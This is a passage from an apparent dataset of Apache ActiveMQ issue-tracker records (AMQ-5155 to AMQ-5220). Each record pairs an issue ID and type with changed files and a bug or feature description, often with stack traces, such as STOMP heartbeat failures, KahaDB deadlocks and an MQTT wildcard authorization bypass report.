changed files:
texts:LevelDB does not store subscribedDestination for durable subscriptions
LevelDB store does not save the subscribedDestination of the SubscriptionInfo for a durable subscription.  This is important because when a restart happens you have no clue if this durable subscription goes with the topic or to a different topic (because of wildcarding).
issueID:AMQ-5155
type:Bug
changed files:StompSocket.java
AbstractStompSocket.java
texts:Heartbeat fails in STOMP over WebSockets
From AMQ-4740:I receive the following error after establishing a connection and heartbeat through stomp.js. This seems to occur after the "PING" is sent.---------- stomp.js output<<< CONNECTEDheart-beat:10000,10000session:ID:localhost.localdomain-45596-1396530920609-2:2server:ActiveMQ/5.10-SNAPSHOTversion:1.1send PING every 10000ms check PONG every 10000ms <<< PONG >>> PING did not receive server activity for the last 20005ms Whoops! Lost connection to ws://172.16.99.73:61614/stomp--------------------- activemq console ---------------WARN | Transport Connection to: StompSocket_19548821 failed: java.io.IOExceptionException in thread "ActiveMQ InactivityMonitor Worker" java.lang.NullPointerExceptionat org.apache.activemq.transport.AbstractInactivityMonitor.onException(AbstractInactivityMonitor.java:314)at org.apache.activemq.transport.AbstractInactivityMonitor$4.run(AbstractInactivityMonitor.java:215)at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)at java.lang.Thread.run(Thread.java:722)WARN | Transport Connection to: StompSocket_19548821 failed: java.io.IOExceptionException in thread "ActiveMQ InactivityMonitor Worker" java.lang.NullPointerExceptionat org.apache.activemq.transport.AbstractInactivityMonitor.onException(AbstractInactivityMonitor.java:314)at org.apache.activemq.transport.AbstractInactivityMonitor$4.run(AbstractInactivityMonitor.java:215)at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)at java.lang.Thread.run(Thread.java:722)For me it looks as if the StompInactivityMonitor is delivering its events to the wrong Transport, i.e. it needs a "narrow()" when setting it up.
issueID:AMQ-5159
type:Bug
changed files:
texts:STOMP browse gets null pointer exception if ACK mode is not AUTO
If a stomp client subscribes as a Queue Browser but doesn"t request the auto acknowledge mode then a NullPointerException is triggered when the end of Browse message is sent.
issueID:AMQ-5160
type:Bug
changed files:
texts:Wildcard subscriptions bypass Authentication / Authorization
I am using MQTT on AMQ 5.9.1After latest MQTT hardening from Dhiraj Sureshkumar Bokde , there is an issue of MQTT retained messages.Simple case:Set Authentication / Authorization for two different TOPICS.Send retained message to one topic.Try to subscribe "#" with other second user.It will show retained messages published by TOPIC 1. here i have attached test configurations.
issueID:AMQ-5162
type:Bug
changed files:
texts:Slave broker does not shutdown after persistence store lockout.
Adding the following exception handler to broker configuration suppose to shutdown broker when persistence store becomes unavailable.<ioExceptionHandler>    <jDBCIOExceptionHandler stopStartConnectors="false"/></ioExceptionHandler>This is seems to work for master broker but the slave broker seems to ignore it and continues to work.
issueID:AMQ-5163
type:Improvement
changed files:
texts:Enable durable topic subscriptions using individual ack mode.
Updates to KahaDB for durable subscription tracking now makes it possible to use individual ack mode with durable subs.  We can now re-enable this feature which was disabled in AMQ-3486
issueID:AMQ-5164
type:Bug
changed files:
texts:QueueMasterSlaveSingleUrlTest.testAdvisory fails
This test currently fails with the following error:testAdvisory(org.apache.activemq.broker.ft.QueueMasterSlaveSingleUrlTest)  Time elapsed: 24.891 sec  <<< FAILURE!junit.framework.AssertionFailedError: Didn"t received advisory at junit.framework.Assert.fail(Assert.java:57) at junit.framework.Assert.assertTrue(Assert.java:22) at junit.framework.Assert.assertNotNull(Assert.java:256) at junit.framework.TestCase.assertNotNull(TestCase.java:426) at org.apache.activemq.broker.ft.QueueMasterSlaveTestSupport.testAdvisory(QueueMasterSlaveTestSupport.java:153) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at junit.framework.TestCase.runTest(TestCase.java:176) at junit.framework.TestCase.runBare(TestCase.java:141) at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:107) at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:113) at junit.framework.TestResult$1.protect(TestResult.java:122) at junit.framework.TestResult.runProtected(TestResult.java:142) at junit.framework.TestResult.run(TestResult.java:125) at junit.framework.TestCase.run(TestCase.java:129) at junit.framework.TestSuite.runTest(TestSuite.java:255) at junit.framework.TestSuite.run(TestSuite.java:250) at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:84) at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:254) at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:149) at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:124) at org.apache.maven.surefire.booter.ForkedBooter.invokeProviderInSameClassLoader(ForkedBooter.java:200) at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:153) at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:103)Results :Failed tests:   QueueMasterSlaveSingleUrlTest>CombinationTestSupport.runBare:113->CombinationTestSupport.runBare:107->QueueMasterSlaveTestSupport.testAdvisory:153 Didn"t received advisoryTests run: 1, Failures: 1, Errors: 0, Skipped: 0
issueID:AMQ-5165
type:Bug
changed files:
texts:Fix destination statistics queue name
Destination statistics queue name is documented asActiveMQ.Statistics.Destination.&#91;DEST_NAME&#93;but it is really implemented asActiveMQ.Statistics.Destination&#91;DEST_NAME&#93;The documented syntax worked on earlier versions due to the way we handled destination map. The fix for https://issues.apache.org/jira/browse/AMQ-5074 changed that, so we need to explicitly support both syntaxes now.
issueID:AMQ-5166
type:Bug
changed files:MessageDatabase.java
texts:MessageDatabase does not consistently apply tracker settings
The "failoverProducersAuditDepth" and "maxFailoverProducersToTrack" settings for MessageDatabase are actually used by the underlying MetaData"s ActiveMQMessageAuditNoSync instance.  However, the MetaData instance and ActiveMQMessageAuditNoSync may change over the life of the MessageDatabase, and these settings are not perpetuated to the new instances (or restored instances).
issueID:AMQ-5167
type:Bug
changed files:
texts:ActiveMQ web-console fails to start in Karaf - missing import
Steps to reprodouce: 1. start Karaf 2.3.5 or 3.0.1. 2. install activemq feature : feature:repo-add activemq 5.9.1 feature:install activemq-broker Stack trace: ~~~aused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name "org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter": Instantiation of bean failed; nested exception is org.springframework.beans.BeanInstantiationException: Could not instantiate bean class &#91;org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter&#93;: Constructor threw exception; nested exception is java.lang.NoClassDefFoundError: javax/xml/stream/XMLStreamException at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateBean(AbstractAutowireCapableBeanFactory.java:1037)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:983)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:487)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:458)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:289)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.web.servlet.DispatcherServlet.createDefaultStrategy(DispatcherServlet.java:810)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.web.servlet.DispatcherServlet.getDefaultStrategies(DispatcherServlet.java:779)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.web.servlet.DispatcherServlet.initHandlerAdapters(DispatcherServlet.java:587)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.web.servlet.DispatcherServlet.initStrategies(DispatcherServlet.java:444)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.web.servlet.DispatcherServlet.onRefresh(DispatcherServlet.java:432)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.web.servlet.FrameworkServlet.onApplicationEvent(FrameworkServlet.java:772)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.web.servlet.FrameworkServlet$ContextRefreshListener.onApplicationEvent(FrameworkServlet.java:1083)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.web.servlet.FrameworkServlet$ContextRefreshListener.onApplicationEvent(FrameworkServlet.java:1080)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.context.event.GenericApplicationListenerAdapter.onApplicationEvent(GenericApplicationListenerAdapter.java:51)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.context.event.SourceFilteringListener.onApplicationEventInternal(SourceFilteringListener.java:96)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.context.event.SourceFilteringListener.onApplicationEvent(SourceFilteringListener.java:68)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.context.event.SimpleApplicationEventMulticaster.multicastEvent(SimpleApplicationEventMulticaster.java:96)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:334)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.context.support.AbstractApplicationContext.finishRefresh(AbstractApplicationContext.java:948)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:482)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.web.servlet.FrameworkServlet.configureAndRefreshWebApplicationContext(FrameworkServlet.java:651)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.web.servlet.FrameworkServlet.createWebApplicationContext(FrameworkServlet.java:599)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.web.servlet.FrameworkServlet.createWebApplicationContext(FrameworkServlet.java:665)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.web.servlet.FrameworkServlet.initWebApplicationContext(FrameworkServlet.java:518)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:459)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.web.servlet.HttpServletBean.init(HttpServletBean.java:136)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at javax.servlet.GenericServlet.init(GenericServlet.java:161)&#91;80:org.apache.geronimo.specs.geronimo-servlet_3.0_spec:1.0&#93; at org.eclipse.jetty.servlet.ServletHolder.initServlet(ServletHolder.java:532)&#91;85:org.eclipse.jetty.aggregate.jetty-all-server:8.1.14.v20131031&#93; ... 33 moreCaused by: org.springframework.beans.BeanInstantiationException: Could not instantiate bean class &#91;org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter&#93;: Constructor threw exception; nested exception is java.lang.NoClassDefFoundError: javax/xml/stream/XMLStreamException at org.springframework.beans.BeanUtils.instantiateClass(BeanUtils.java:163)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:87)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateBean(AbstractAutowireCapableBeanFactory.java:1030)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93; ... 60 moreCaused by: java.lang.NoClassDefFoundError: javax/xml/stream/XMLStreamException at org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.<init>(AnnotationMethodHandlerAdapter.java:203)&#91;145:org.apache.activemq.activemq-web-console:5.9.1&#93;~~~
issueID:AMQ-517
type:Improvement
changed files:
texts:Create a C++ client for ActiveMQ that can work with STOMP and OpenWire
I"ve created this issue to post my code.Attached is my first cut at CMS (C++ Message Service) with a Stomp client.  The idea is that CMS is the API (like JMS) and any messaging protocol can be used behind it (Stomp, OpenWire, etc).  The "docs" folder contains the doxygen html for the source as well as a pdf document that gives a high-level overview.
issueID:AMQ-5171
type:Improvement
changed files:ZeroconfDiscoveryAgent.java
texts:Boreker configured as zeroconf service is not discovered by Bonjour browser running in ios
Configure broker to expose its URi via zeroconf agent using :queueContext.xml<amq:transportConnectors>    <amq:transportConnector name="mqtt" uri="${jms.brokerurl}" discoveryUri="zeroconf://mainnode"/>   </amq:transportConnectors>The service exposed is not discovered by ios or iosX Bonjour browser   (you can use Bonjour Browser on mac  to test it)
issueID:AMQ-5174
type:Bug
changed files:
texts:Cannot use the JDBCIOExceptionHandler when kahadb is configured with lease-database-locker
The JDBCIOExceptionHandler is limited to operating with the JDBCPersistenceAdapter. It should be allowed to work in combination with the KahaDBPersistenceAdapter if it"s configured to use a LeaseDatabaseLocker as a locker.
issueID:AMQ-5175
type:Improvement
changed files:
texts:exclude bouncycastle dependency from unit tests run
The ApacheDS dependency used in the AMQ unit tests pulls in an old bouncycastle lib that creates errors in JDK 1.7 releases.  Exclude this jar from the tests.
issueID:AMQ-5176
type:New Feature
changed files:
texts:Support building ActiveMQ using Java 8 JDK
None
issueID:AMQ-5182
type:Bug
changed files:AjaxListener.java
texts:ActiveMQ web demo - chat example - Very slow on JBoss7 after AMQ-4801
When running the chat example on JBoss 7, the Ajax Servlet uses the Jetty Servlet 3.0 Continuation support.The chat client is terribly slow in this case. A chat message is only received when the polling connector starts polling, every 30 seconds.In ActiveMQ 5.8, the chat messages come in immediately.
issueID:AMQ-5183
type:Improvement
changed files:AmqpProtocolConverter.java
texts:Switch to using Proton&#39;s Event logic for detecting AMQP state changes
We currently use a polling model to detect state changes in the proton engine when new data arrives.  The recent update to Proton v0.7.0 allows us to switch to the new Event Collector model and remove the polling code.  This change results in lower overhead when processing incoming AMQP frames and increases performance of the AMQP transport layer.
issueID:AMQ-5186
type:Bug
changed files:AmqpProtocolConverter.java
texts:AMQP producers aren&#39;t removed
Consumers are only closed when the whole session is removed.
issueID:AMQ-5187
type:Bug
changed files:
texts:Virtual destination consumers do not support retroactive message recovery
Virtual destinations intercept messages sent by producers and pass them onto consumers, but when consumers connect to mapped destinations, they do not receive retroactive messages. This is particularly required for MQTT clients using virtual topics to send retained messages to consumer queues.
issueID:AMQ-5189
type:Bug
changed files:XaConnectionPool.java
texts:Rollback on XASession when closing back to pool
If you have a pool of XASession under load (heavy load might be necessary) I register sometimes following Exception "Cannot rollback() inside an XASession" in afterCompletion synchronisation. After some analysis and patching with logging I recognized that the session object is returned back to pool before setting the xa flag back to false. This leads to the effect that this session gets be used again by another thread while the earlier one switches the xa flag to false.
issueID:AMQ-519
type:Bug
changed files:
texts:Objects in ActiveMQObjectMessage are not always de-serialized and there are side effects when redelivered
When using an embedded broker with ra, and the message is redelivered (for example after a rollback), the same object is given as a result from the ObjectMessage.getObject call.This can cause undesirable side effects when the object has been modified in the first (rollbacked) transaction.To test: in Servicemix, run the org.apache.servicemix.jbi.messaging.JcaFlowPersistentTest test case.Need to remove the workaround in JCAfFlow.onMessage, line 465, to make the test fail.
issueID:AMQ-5193
type:Bug
changed files:
texts:Java Files Started Appearing in activemq-all jar starting in 5.9.0
activemq-all-5.8.0.jar and older versions do not contain any .java files, only .class files as I would expect.  Strating in version activemq-all-5.9.0.jar .java and .class files are included in the JAR. Was this intentional?  I"m having a problem related to the fact that Maven is attempting to compile the.java files within the jar.  I"m sure I can work around the issue in the short term, however I wanted to make sure that you were aware of it.  It seems odd to me that the .java files are included in the .jar file, normally they would only appear in the sources jar (example: activemq-all-5.9.0-sources.jar).
issueID:AMQ-5195
type:Bug
changed files:AmqpProtocolConverter.java
texts:AMQP protocol handler doesn&#39;t set session incoming capacity
The AMQP protocol converter doesn"t currently set the incoming credit on an open session which forces a flow frame to be sent back to a producer on every message even if the producer has available credit.  We should set the session credit to the (max frame size * producer prefetch).  We also need to better handle the remotely settled state of producer deliveries such that we only send a flow frame back when credit is running low to reduce the frames that travel back on every receive.
issueID:AMQ-5198
type:Bug
changed files:ActiveMQConnection.java
texts:MessageConsumer and Producer are not thread safe
We currently have an object that acts both as a consumer and as a producer over the same queue.Lazy initialization of the scheduler is not 100% thread safe when a consumer and a producer are created sharing the same connection.We encountered the following sporadic NPE when a rollback() is invoked:Caused by: java.lang.NullPointerException        at org.apache.activemq.thread.Scheduler.executeAfterDelay(Scheduler.java:64)        at org.apache.activemq.ActiveMQMessageConsumer.rollback(ActiveMQMessageConsumer.java:1278)        at org.apache.activemq.ActiveMQMessageConsumer$5.afterRollback(ActiveMQMessageConsumer.java:1054)        at org.apache.activemq.TransactionContext.afterRollback(TransactionContext.java:157)        ... 11 moreWe believe that the lazy initialized getScheduler() is open for a race condition when a publish and rollback are happening concurrently.try {                        result = scheduler = new Scheduler("ActiveMQConnection["+info.getConnectionId().getValue()+"] Scheduler");                        scheduler.start();                    } catch(Exception e) {                        throw JMSExceptionSupport.create(e);                    }The suggested fix is to simply invoke the start within the constructor of the Scheduler class.
issueID:AMQ-5209
type:Improvement
changed files:
texts:Add additional properties to advisory for consumed, delivered and discarded
Add information as message properties to the advisory events for Message ID and Destination so that clients can read information using standard JMS API calls.
issueID:AMQ-5211
type:Bug
changed files:
texts:ActiveMQDestination.createDestination() should prevent empty destination name
currently you can call ActiveMQDestination createDestination("",ActiveMQDestination.QUEUE_TYPE) to create a queue with no name.  while this doesn"t seem to be an issue at first...if you are using mKahadb, ActiveMQ will fail to restart after this queue/store directory are created.see this post: http://activemq.2283324.n4.nabble.com/mkahadb-Failed-to-start-per-destination-persistence-adapter-for-destination-td4678754.html#a4679848the web console already prevents this, we should prevent this from other entry points to this API (QueueView.moveMessagesTo() from JMX in my case)...
issueID:AMQ-5212
type:Bug
changed files:
texts:Deadlock with duplicate detection and dlq processing in kahadb
Contention between access to the destination map from store duplicate processing and dlq destination creation from the cursor. But could be between any destination creation/deletion.From the test case: Found one Java-level deadlock:============================="ActiveMQ Transport: tcp://27.0.0.1:60895@60852":  waiting for ownable synchronizer 7df695ea8, (a java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync),  which is held by "ActiveMQ Transport: tcp://27.0.0.1:60894@60852""ActiveMQ Transport: tcp://27.0.0.1:60894@60852":  waiting for ownable synchronizer 7df605fd8, (a java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync),  which is held by "ConcurrentQueueStoreAndDispatch""ConcurrentQueueStoreAndDispatch":  waiting for ownable synchronizer 7df695ea8, (a java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync),  which is held by "ActiveMQ Transport: tcp://27.0.0.1:60894@60852"Java stack information for the threads listed above:==================================================="ActiveMQ Transport: tcp://27.0.0.1:60895@60852": at sun.misc.Unsafe.park(Native Method) - parking to wait for  <7df695ea8> (a java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync) at java.util.concurrent.locks.LockSupport.park(LockSupport.java:156) at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:811) at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:842) at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1178) at java.util.concurrent.locks.ReentrantReadWriteLock$WriteLock.lock(ReentrantReadWriteLock.java:890) at org.apache.activemq.broker.region.AbstractRegion.addDestination(AbstractRegion.java:129) at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:334) at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:172) at org.apache.activemq.advisory.AdvisoryBroker.addDestination(AdvisoryBroker.java:184) at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:172) at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:172) at org.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:177) at org.apache.activemq.broker.region.RegionBroker.addProducer(RegionBroker.java:384) at org.apache.activemq.broker.BrokerFilter.addProducer(BrokerFilter.java:107) at org.apache.activemq.advisory.AdvisoryBroker.addProducer(AdvisoryBroker.java:172) at org.apache.activemq.broker.CompositeDestinationBroker.addProducer(CompositeDestinationBroker.java:56) at org.apache.activemq.broker.BrokerFilter.addProducer(BrokerFilter.java:107) at org.apache.activemq.broker.MutableBrokerFilter.addProducer(MutableBrokerFilter.java:112) at org.apache.activemq.broker.TransportConnection.processAddProducer(TransportConnection.java:565) at org.apache.activemq.command.ProducerInfo.visit(ProducerInfo.java:108) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:294) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:148) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196) at java.lang.Thread.run(Thread.java:695)"ActiveMQ Transport: tcp://27.0.0.1:60894@60852": at sun.misc.Unsafe.park(Native Method) - parking to wait for  <7df605fd8> (a java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync) at java.util.concurrent.locks.LockSupport.park(LockSupport.java:156) at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:811) at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:842) at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1178) at java.util.concurrent.locks.ReentrantReadWriteLock$WriteLock.lock(ReentrantReadWriteLock.java:890) at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.getMessageCount(KahaDBStore.java:490) at org.apache.activemq.store.ProxyMessageStore.getMessageCount(ProxyMessageStore.java:101) at org.apache.activemq.broker.region.Queue.initialize(Queue.java:389) at org.apache.activemq.broker.region.DestinationFactoryImpl.createDestination(DestinationFactoryImpl.java:87) at org.apache.activemq.broker.region.AbstractRegion.createDestination(AbstractRegion.java:546) at org.apache.activemq.broker.region.AbstractRegion.addDestination(AbstractRegion.java:135) at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:334) at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:172) at org.apache.activemq.advisory.AdvisoryBroker.addDestination(AdvisoryBroker.java:184) at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:172) at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:172) at org.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:177) at org.apache.activemq.broker.region.RegionBroker.addProducer(RegionBroker.java:384) at org.apache.activemq.broker.BrokerFilter.addProducer(BrokerFilter.java:107) at org.apache.activemq.advisory.AdvisoryBroker.addProducer(AdvisoryBroker.java:172) at org.apache.activemq.broker.CompositeDestinationBroker.addProducer(CompositeDestinationBroker.java:56) at org.apache.activemq.broker.BrokerFilter.addProducer(BrokerFilter.java:107) at org.apache.activemq.broker.MutableBrokerFilter.addProducer(MutableBrokerFilter.java:112) at org.apache.activemq.broker.TransportConnection.processAddProducer(TransportConnection.java:565) at org.apache.activemq.command.ProducerInfo.visit(ProducerInfo.java:108) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:294) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:148) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196) at java.lang.Thread.run(Thread.java:695)"ConcurrentQueueStoreAndDispatch": at sun.misc.Unsafe.park(Native Method) - parking to wait for  <7df695ea8> (a java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync) at java.util.concurrent.locks.LockSupport.park(LockSupport.java:156) at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:811) at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireShared(AbstractQueuedSynchronizer.java:941) at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireShared(AbstractQueuedSynchronizer.java:1261) at java.util.concurrent.locks.ReentrantReadWriteLock$ReadLock.lock(ReentrantReadWriteLock.java:677) at org.apache.activemq.broker.region.AbstractRegion.getDestinations(AbstractRegion.java:243) at org.apache.activemq.broker.region.RegionBroker.getDestinations(RegionBroker.java:149) at org.apache.activemq.store.kahadb.KahaDBStore.rollbackStatsOnDuplicate(KahaDBStore.java:286) at org.apache.activemq.store.kahadb.MessageDatabase.updateIndex(MessageDatabase.java:1316) at org.apache.activemq.store.kahadb.MessageDatabase$11.execute(MessageDatabase.java:1140) at org.apache.activemq.store.kahadb.disk.page.Transaction.execute(Transaction.java:779) at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:1137) at org.apache.activemq.store.kahadb.MessageDatabase$10.visit(MessageDatabase.java:1074) at org.apache.activemq.store.kahadb.data.KahaAddMessageCommand.visit(KahaAddMessageCommand.java:241) at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:1071) at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:978) at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:958) at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.addMessage(KahaDBStore.java:426) at org.apache.activemq.store.kahadb.KahaDBStore$StoreQueueTask.run(KahaDBStore.java:1281) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:895) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:918) at java.lang.Thread.run(Thread.java:695)Found 1 deadlock.
issueID:AMQ-5213
type:New Feature
changed files:
texts:Allow for changing logger levels via JMX
Create a new MBean that is loaded if the Broker is running with Log4J as which would allow for changing the level of loggers via JMX to enable debug without needing access to the log4j.properties.
issueID:AMQ-5214
type:Improvement
changed files:TransportConnection.java
texts:Security errors for sync commands are only logged at debug levels
For any operation that sends a sync commands (response required) there is no warning logs indicating a security exception was triggered.  In the async case we log in detail.  We should add a log at warn level for security errors sent back as responses.
issueID:AMQ-5216
type:Bug
changed files:
texts:BrokerXmlConfigStartTest fails on Windows
This test fails on windows because paths are not built correctly.Error MessageIllegal character in opaque part at index 8: xbean:E:jworkspaceactivemq-5.9.0.redhat-6-1-x-patch-platformjdkjdk7labelwindowsassembly	argetconf/activemq-dynamic-network-broker1.xmlStacktracejava.net.URISyntaxException: Illegal character in opaque part at index 8: xbean:E:jworkspaceactivemq-5.9.0.redhat-6-1-x-patch-platformjdkjdk7labelwindowsassembly	argetconf/activemq-dynamic-network-broker1.xml at java.net.URI$Parser.fail(URI.java:2829) at java.net.URI$Parser.checkChars(URI.java:3002) at java.net.URI$Parser.parse(URI.java:3039) at java.net.URI.<init>(URI.java:595) at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:85) at org.apache.activemq.config.BrokerXmlConfigStartTest.testStartBrokerUsingXmlConfig1(BrokerXmlConfigStartTest.java:87)
issueID:AMQ-5218
type:New Feature
changed files:
texts:Provide a way to export/import destinations created during runtime
In some environments we clients can"t create destinations and only administrators are allowed to do that. As destinations are not part of the configuration, we need a mechanism to replicate destinations on another broker.
issueID:AMQ-522
type:Test
changed files:
texts:get ProxyConnectorTest to work
Running this test case hangs in iago.simulalabs.com. The test log file is empty.
issueID:AMQ-5220
type:Bug
changed files:
texts:Advisory messages are still empty when received with a Stomp subscription
